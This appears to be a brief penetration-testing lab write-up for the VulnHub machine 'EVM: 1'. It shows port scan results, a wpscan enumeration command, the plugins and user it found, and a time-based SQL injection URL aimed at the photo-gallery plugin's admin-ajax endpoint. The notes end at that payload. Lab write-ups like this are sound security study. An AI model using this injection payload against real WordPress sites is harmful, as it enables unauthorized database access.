# EVM: 1

2025.02.27 https://www.vulnhub.com/entry/evm-1,391/

## Ip

192.168.5.39

## Scan

```
PORT    STATE SERVICE
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
```

smb 无访问权限，enum4linux-ng 也没枚举出用户。

访问 80 web 发现提示：ou can find me at /wordpress/ im vulnerable webapp :)

目录扫描也能扫描出上面的目录，同时扫出 http://192.168.5.39/info.php 是个 phpinfo 页面。

查看 wordpress, 发现加载有问题，源码中是加载的http://192.168.56.103 固定了 ip 有一些加载有问题。

wpscan 先扫描：

```
wpscan --url http://192.168.5.39/wordpress/ -e u,ap,at,tt,cb --plugins-detection mixed
```

扫描到一个用户 c0rrupt3d_brain，发现几个插件 akismet 4.1.2 、 photo-gallery 1.5.34 、 wp-responsive-thumbnail-slider 1.0 、 wp-vault 0.8.6.6

看看这几个插件哪个有漏洞，

```
http://192.168.5.39/wordpress/wp-admin/admin-ajax.php?action=albumsgalleries_bwg&album_id=0 AND (SELECT 1 FROM (SELECT(SLEEP(10)))BLAH)&width=785&height=550&bwg_nonce=9e367490cc&
```
